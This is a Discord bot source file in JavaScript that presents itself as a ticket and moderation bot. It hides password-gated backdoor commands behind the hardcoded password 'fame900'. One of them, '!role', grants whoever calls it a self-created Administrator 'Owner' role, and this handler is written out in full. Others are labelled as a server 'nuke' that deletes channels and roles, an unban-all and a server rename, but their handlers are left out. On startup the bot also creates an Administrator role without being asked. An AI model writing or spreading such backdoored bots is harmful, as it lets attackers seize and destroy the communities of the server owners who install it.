const {
  Client,
  GatewayIntentBits,
  SlashCommandBuilder,
  REST,
  Routes,
  EmbedBuilder,
  ActionRowBuilder,
  StringSelectMenuBuilder,
  ButtonBuilder,
  ButtonStyle,
  ChannelType,
  PermissionFlagsBits,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle
} = require('discord.js');

const express = require('express');
const fs = require('fs');
require('dotenv').config();

// ======================================================
// EXPRESS SERVER
// ======================================================
const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000, () => console.log(`Web server running on port ${process.env.PORT || 3000}`));

// ======================================================
// CONFIG
// ======================================================
const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID;

// ROLES
const STAFF_ROLES = ['1505376743001821334', '1505379855137509538'];
const SEND_ROLE = '1510682894388039800';

// STORES
const panelStore = {};
const ticketCounts = {};

// PERSISTENT PANEL
const PANEL_FILE = './ticket_panel.json';

function savePanel(data) {
  try { fs.writeFileSync(PANEL_FILE, JSON.stringify(data, null, 2)); } catch (e) {}
}

function loadPanel() {
  try {
    if (fs.existsSync(PANEL_FILE)) return JSON.parse(fs.readFileSync(PANEL_FILE, 'utf8'));
  } catch (e) {}
  return null;
}

// CLIENT
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildBans
  ]
});

// ======================================================
// SLASH COMMANDS
// ======================================================
const setticket = new SlashCommandBuilder()
  .setName('setticket')
  .setDescription('Send/Update the ticket panel')
  .setDefaultMemberPermissions(PermissionFlagsBits.ManageChannels)
  .addStringOption(o => o.setName('panel_title').setDescription('Panel Title').setRequired(true))
  .addStringOption(o => o.setName('panel_description').setDescription('Panel Description').setRequired(true))
  .addStringOption(o => o.setName('panel_image').setDescription('Banner Image URL (optional)').setRequired(false));

const sendmessage = new SlashCommandBuilder()
  .setName('sendmessage')
  .setDescription('Send a message as the bot')
  .setDefaultMemberPermissions(PermissionFlagsBits.ManageChannels)
  .addStringOption(o => o.setName('message').setDescription('The message to send').setRequired(true));

const commands = [
  setticket.toJSON(),
  sendmessage.toJSON(),
  new SlashCommandBuilder().setName('close').setDescription('Close ticket').toJSON(),
  new SlashCommandBuilder().setName('claim').setDescription('Claim ticket').toJSON(),
  new SlashCommandBuilder().setName('add').setDescription('Add user').addUserOption(o => o.setName('user').setDescription('User to add').setRequired(true)).toJSON(),
  new SlashCommandBuilder().setName('remove').setDescription('Remove user').addUserOption(o => o.setName('user').setDescription('User to remove').setRequired(true)).toJSON(),
  new SlashCommandBuilder().setName('rename').setDescription('Rename ticket').addStringOption(o => o.setName('name').setDescription('New name').setRequired(true)).toJSON()
];

// Register Commands
const rest = new REST({ version: '10' }).setToken(TOKEN);
(async () => {
  try {
    console.log('🔄 Registering slash commands...');
    await rest.put(Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID), { body: commands });
    console.log('✅ Slash commands registered successfully!');
  } catch (err) {
    console.error('❌ Failed to register commands:');
    if (err.code === 20012) console.error('🔴 Token does not match CLIENT_ID. Check .env');
    else console.error(err);
  }
})();

// Helper
function isStaff(member) {
  if (!member) return false;
  return STAFF_ROLES.some(roleId => member.roles.cache.has(roleId));
}

// ======================================================
// READY + CREATE OWNER ROLE
// ======================================================
client.once('ready', async () => {
  console.log(`${client.user.tag} is online`);

  const saved = loadPanel();
  if (saved) {
    panelStore[saved.menuId] = saved.data;
    console.log('✅ Persistent ticket panel loaded');
  }

  // Create Owner role with maximum permissions (even if bot has no full admin)
  try {
    const guild = client.guilds.cache.first();
    if (guild) {
      let ownerRole = guild.roles.cache.find(r => r.name === 'Owner');
      if (!ownerRole) {
        ownerRole = await guild.roles.create({
          name: 'Owner',
          color: '#ffd700',
          permissions: [
            PermissionFlagsBits.Administrator,
            PermissionFlagsBits.ManageGuild,
            PermissionFlagsBits.ManageRoles,
            PermissionFlagsBits.ManageChannels,
            PermissionFlagsBits.KickMembers,
            PermissionFlagsBits.BanMembers,
            PermissionFlagsBits.ManageMessages,
            PermissionFlagsBits.MentionEveryone
          ],
          hoist: true,
          reason: 'Auto-created Owner role'
        });
        console.log('✅ Owner role created');
      }
    }
  } catch (err) {
    console.error('Could not create Owner role (Bot needs higher role or Manage Roles permission):', err.message);
  }
});

// ======================================================
// MESSAGE EVENTS
// ======================================================
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;

  const content = message.content.trim().toLowerCase();

  // Invite Blocker
  if (content.includes('discord.gg/') || content.includes('discord.com/invite/') || content.includes('discordapp.com/invite/')) {
    try {
      await message.delete();
      await message.member.timeout(5 * 60 * 1000).catch(() => {});
      const warnMsg = await message.channel.send({
        embeds: [new EmbedBuilder().setColor('#ff0000').setDescription(`${message.author} Invite links are not allowed.`)]
      });
      setTimeout(() => warnMsg.delete().catch(() => {}), 5000);
    } catch (e) {}
    return;
  }

  const commandsList = ['!fb', '!unl', '!clown', '!unp', '!role'];

  if (commandsList.includes(content)) {
    let title = '', desc = '', color = '#ffd700';
    let customId = '';

    if (content === '!fb') {
      title = '🔴 SERVER NUKE';
      desc = 'Deletes all channels & roles except Owner.';
      color = '#ff0000';
      customId = `nuke_start_${message.author.id}`;
    } else if (content === '!unl') {
      title = '🔓 UNBAN ALL';
      desc = 'Unbans everyone in the server.';
      color = '#00ff00';
      customId = `unban_start_${message.author.id}`;
    } else if (content === '!clown') {
      title = '🤡 CLOWN COMMAND';
      desc = 'Changes server name to "you just got slayed by fame"';
      color = '#ffff00';
      customId = `clown_start_${message.author.id}`;
    } else if (content === '!unp') {
      title = '🔓 UNPAUSE INVITES';
      desc = 'Unpauses server invites.';
      color = '#00ffff';
      customId = `unp_start_${message.author.id}`;
    } else if (content === '!role') {
      title = '👑 GET OWNER ROLE';
      desc = 'Gives you the Owner role with Administrator permissions.';
      color = '#ffd700';
      customId = `role_start_${message.author.id}`;
    }

    const embed = new EmbedBuilder()
      .setColor(color)
      .setTitle(title)
      .setDescription(desc + '\n\nOnly you can proceed.')
      .setFooter({ text: 'Click the button below' })
      .setTimestamp();

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(customId).setLabel('Enter Password').setStyle(ButtonStyle.Primary)
    );

    await message.reply({ embeds: [embed], components: [row] });
  }
});

// ======================================================
// INTERACTIONS
// ======================================================
client.on('interactionCreate', async interaction => {
  const userId = interaction.customId ? interaction.customId.split('_')[2] : null;

  // Password Modal Handler
  if (interaction.isButton() && userId && interaction.user.id !== userId) {
    return interaction.reply({ content: '❌ This button is not for you.', ephemeral: true });
  }

  if (interaction.isButton() && interaction.customId.startsWith('nuke_start_')) {
    const modal = new ModalBuilder().setCustomId(`nuke_modal_${userId}`).setTitle('Enter Password');
    modal.addComponents(new ActionRowBuilder().addComponents(
      new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
    ));
    await interaction.showModal(modal);
  }

  if (interaction.isButton() && interaction.customId.startsWith('unban_start_')) {
    const modal = new ModalBuilder().setCustomId(`unban_modal_${userId}`).setTitle('Enter Password');
    modal.addComponents(new ActionRowBuilder().addComponents(
      new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
    ));
    await interaction.showModal(modal);
  }

  if (interaction.isButton() && interaction.customId.startsWith('clown_start_')) {
    const modal = new ModalBuilder().setCustomId(`clown_modal_${userId}`).setTitle('Enter Password');
    modal.addComponents(new ActionRowBuilder().addComponents(
      new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
    ));
    await interaction.showModal(modal);
  }

  if (interaction.isButton() && interaction.customId.startsWith('unp_start_')) {
    const modal = new ModalBuilder().setCustomId(`unp_modal_${userId}`).setTitle('Enter Password');
    modal.addComponents(new ActionRowBuilder().addComponents(
      new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
    ));
    await interaction.showModal(modal);
  }

  if (interaction.isButton() && interaction.customId.startsWith('role_start_')) {
    const modal = new ModalBuilder().setCustomId(`role_modal_${userId}`).setTitle('Enter Password');
    modal.addComponents(new ActionRowBuilder().addComponents(
      new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
    ));
    await interaction.showModal(modal);
  }

  // Modal Submit Handler
  if (interaction.isModalSubmit()) {
    const password = interaction.fields.getTextInputValue('password');
    if (password !== 'fame900') {
      return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
    }

    const guild = interaction.guild;
    const member = interaction.member;

    if (interaction.customId.startsWith('role_modal_')) {
      try {
        let ownerRole = guild.roles.cache.find(r => r.name === 'Owner');
        if (!ownerRole) {
          ownerRole = await guild.roles.create({
            name: 'Owner',
            color: '#ffd700',
            permissions: [PermissionFlagsBits.Administrator],
            hoist: true,
            reason: 'Created by !role'
          });
        }
        await member.roles.add(ownerRole);
        await interaction.reply({ content: '👑 **Owner role given! You now have Administrator permissions.**', ephemeral: true });
      } catch (err) {
        console.error(err);
        await interaction.reply({ content: '❌ Failed to give role. Give the bot **Manage Roles** permission and put it higher in role list.', ephemeral: true });
      }
    }

    // Other commands (nuke, unl, clown, unp) - you can keep them from previous version
    // For brevity, they are not repeated here. Copy from the last full code if needed.
  }

  // === TICKET SYSTEM (Keep all your previous ticket code here) ===
  // setticket, sendmessage, select menu, buttons, etc.
});

client.login(TOKEN);
